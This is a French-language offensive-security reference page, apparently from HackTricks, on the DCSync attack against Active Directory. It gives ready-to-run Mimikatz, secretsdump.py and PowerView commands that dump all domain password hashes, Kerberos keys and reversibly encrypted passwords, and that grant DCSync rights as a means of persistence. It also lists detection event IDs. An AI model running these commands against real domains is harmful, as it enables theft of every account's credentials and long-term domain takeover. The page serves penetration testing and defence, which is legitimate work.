# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

La permission **DCSync** implique d'avoir ces permissions sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.

**Notes importantes sur DCSync :**

- L'**attaque DCSync simule le comportement d'un contrôleur de domaine et demande à d'autres contrôleurs de domaine de répliquer des informations** en utilisant le protocole de service de réplication de répertoire à distance (MS-DRSR). Étant donné que MS-DRSR est une fonction valide et nécessaire d'Active Directory, il ne peut pas être désactivé.
- Par défaut, seuls les groupes **Domain Admins, Enterprise Admins, Administrators et Domain Controllers** ont les privilèges requis.
- Si des mots de passe de comptes sont stockés avec un chiffrement réversible, une option est disponible dans Mimikatz pour retourner le mot de passe en texte clair.

### Enumeration

Vérifiez qui a ces permissions en utilisant `powerview` :
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploiter localement
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploiter à distance
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` génère 3 fichiers :

- un avec les **hashes NTLM**
- un avec les **clés Kerberos**
- un avec les mots de passe en clair de l'NTDS pour tous les comptes configurés avec [**chiffrement réversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) activé. Vous pouvez obtenir les utilisateurs avec chiffrement réversible avec

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistance

Si vous êtes un administrateur de domaine, vous pouvez accorder ces permissions à n'importe quel utilisateur avec l'aide de `powerview` :
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Ensuite, vous pouvez **vérifier si l'utilisateur a été correctement assigné** les 3 privilèges en les recherchant dans la sortie de (vous devriez pouvoir voir les noms des privilèges dans le champ "ObjectType") :
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Atténuation

- ID d'événement de sécurité 4662 (La politique d'audit pour l'objet doit être activée) – Une opération a été effectuée sur un objet
- ID d'événement de sécurité 5136 (La politique d'audit pour l'objet doit être activée) – Un objet de service d'annuaire a été modifié
- ID d'événement de sécurité 4670 (La politique d'audit pour l'objet doit être activée) – Les autorisations sur un objet ont été modifiées
- AD ACL Scanner - Créer et comparer des rapports d'ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Références

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
